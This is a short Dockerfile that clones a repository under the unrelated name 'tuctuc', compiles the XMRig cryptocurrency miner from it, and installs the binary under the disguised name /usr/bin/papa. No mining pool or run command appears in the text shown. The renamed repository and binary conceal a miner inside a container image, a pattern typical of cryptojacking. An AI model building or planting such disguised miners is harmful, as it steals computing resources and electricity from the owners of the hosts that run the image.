FROM ubuntu:latest  
  
RUN apt-get update && apt-get install -y software-properties-common -y  
RUN add-apt-repository ppa:jonathonf/gcc-7.1 -y  
RUN apt-get update && apt-get install git build-essential cmake libuv1-dev
libmicrohttpd-dev gcc-7 g++-7 -y  
  
RUN git clone https://github.com/vajisah50/tuctuc.git  
RUN mkdir tuctuc/build  
RUN cd tuctuc/build && cmake .. -DCMAKE_C_COMPILER=gcc-7
-DCMAKE_CXX_COMPILER=g++-7  
RUN cd tuctuc/build && make  
RUN mv tuctuc/build/xmrig /usr/bin/papa  

